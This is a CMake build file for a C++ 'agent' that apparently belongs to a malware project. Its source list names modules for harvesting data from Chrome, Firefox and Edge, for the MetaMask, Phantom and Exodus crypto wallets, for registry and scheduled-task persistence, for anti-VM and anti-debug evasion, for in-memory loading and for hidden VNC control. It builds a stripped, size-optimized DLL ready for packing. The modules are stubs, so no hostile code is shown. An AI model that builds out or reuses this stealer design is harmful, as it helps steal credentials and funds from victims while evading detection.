# Agent CMakeLists.txt
cmake_minimum_required(VERSION 3.16)

# Define agent executable
set(AGENT_NAME rt_srt_agent)

# Core source files (implemented)
set(CORE_SOURCES
    src/main.cpp
    src/logger/file_logger.cpp
    src/logger/encrypt_logger.cpp
)

# Module source files (stubs for now)
set(MODULE_SOURCES
    src/browser/chrome.cpp
    src/browser/firefox.cpp
    src/browser/edge.cpp
    src/crypto/metamask.cpp
    src/crypto/phantom.cpp
    src/crypto/exodus.cpp
    src/persistence/task_scheduler.cpp
    src/persistence/registry.cpp
    src/stealth/anti_vm.cpp
    src/stealth/anti_debug.cpp
    src/stealth/in_memory_loader.cpp
    src/hvnc/create_desktop.cpp
    src/hvnc/control_session.cpp
)

# All sources
set(AGENT_SOURCES ${CORE_SOURCES} ${MODULE_SOURCES})

# Build as DLL by default, EXE as option
option(BUILD_AS_EXE "Build agent as EXE instead of DLL" OFF)

if(BUILD_AS_EXE)
    add_executable(${AGENT_NAME} ${AGENT_SOURCES})
    target_compile_definitions(${AGENT_NAME} PRIVATE BUILD_AS_EXE)
else()
    add_library(${AGENT_NAME} SHARED ${AGENT_SOURCES})
endif()

# Include directories
target_include_directories(${AGENT_NAME} PRIVATE
    ${CMAKE_CURRENT_SOURCE_DIR}/src
    ${CMAKE_CURRENT_SOURCE_DIR}/include
)

# Platform-specific settings
if(WIN32)
    # Windows-specific compile definitions
    target_compile_definitions(${AGENT_NAME} PRIVATE
        WIN32_LEAN_AND_MEAN
        _WIN32_WINNT=0x0601  # Windows 7 minimum
        UNICODE
        _UNICODE
        NOMINMAX             # Prevent min/max macros
        _CRT_SECURE_NO_WARNINGS
    )
    
    # Windows libraries
    target_link_libraries(${AGENT_NAME} PRIVATE
        kernel32
        user32
        shell32
        advapi32
        crypt32
        bcrypt
        ws2_32
        wininet
        shlwapi
        ole32
        oleaut32
        uuid
    )
    
    # Set subsystem
    if(BUILD_AS_EXE)
        set_target_properties(${AGENT_NAME} PROPERTIES
            LINK_FLAGS "/SUBSYSTEM:WINDOWS /ENTRY:WinMainCRTStartup"
        )
    else()
        set_target_properties(${AGENT_NAME} PROPERTIES
            LINK_FLAGS "/SUBSYSTEM:WINDOWS /DLL"
        )
    endif()
endif()

# Optimization settings
if(MSVC)
    target_compile_options(${AGENT_NAME} PRIVATE
        /W4           # Warning level 4
        /WX-          # Don't treat warnings as errors
        /Oi           # Enable intrinsic functions
        /Oy           # Omit frame pointers
        /GF           # String pooling
        /Gy           # Function-level linking
        /EHsc         # Enable C++ exceptions
        /GR-          # Disable RTTI
    )
    
    # Release optimizations
    if(CMAKE_BUILD_TYPE STREQUAL "Release")
        target_compile_options(${AGENT_NAME} PRIVATE
            /O1       # Optimize for size
            /Os       # Favor small code
            /Ob2      # Inline expansion
            /GL       # Whole program optimization
        )
        
        set_target_properties(${AGENT_NAME} PROPERTIES
            LINK_FLAGS "${CMAKE_EXE_LINKER_FLAGS} /LTCG"
        )
    endif()
else()
    target_compile_options(${AGENT_NAME} PRIVATE
        -Wall
        -Wextra
        -Wpedantic
        -Wno-unused-parameter
        -fvisibility=hidden
        -fvisibility-inlines-hidden
        -fno-exceptions
        -fno-rtti
    )
    
    if(CMAKE_BUILD_TYPE STREQUAL "Release")
        target_compile_options(${AGENT_NAME} PRIVATE
            -Os
            -ffunction-sections
            -fdata-sections
            -flto
        )
        
        set_target_properties(${AGENT_NAME} PROPERTIES
            LINK_FLAGS "-Wl,--gc-sections -Wl,--strip-all -flto"
        )
    endif()
endif()

# Strip debug info in Release
if(CMAKE_BUILD_TYPE STREQUAL "Release")
    if(MSVC)
        set_target_properties(${AGENT_NAME} PROPERTIES
            LINK_FLAGS "${CMAKE_EXE_LINKER_FLAGS} /DEBUG:NONE"
        )
    else()
        add_custom_command(TARGET ${AGENT_NAME} POST_BUILD
            COMMAND ${CMAKE_STRIP} $<TARGET_FILE:${AGENT_NAME}>
        )
    endif()
endif()

# Size optimization post-build
add_custom_command(TARGET ${AGENT_NAME} POST_BUILD
    COMMAND ${CMAKE_COMMAND} -E echo "Agent size before packing: "
    COMMAND ${CMAKE_SIZE} $<TARGET_FILE:${AGENT_NAME}>
)

# Create stub files if they don't exist (for initial compilation)
foreach(source_file ${MODULE_SOURCES})
    if(NOT EXISTS ${CMAKE_CURRENT_SOURCE_DIR}/${source_file})
        file(WRITE ${CMAKE_CURRENT_SOURCE_DIR}/${source_file} 
            "// Stub file for ${source_file}\n// TODO: Implement\n\n#include \"../common.h\"\n")
    endif()
endforeach()

# Export compile commands for development
set(CMAKE_EXPORT_COMPILE_COMMANDS ON)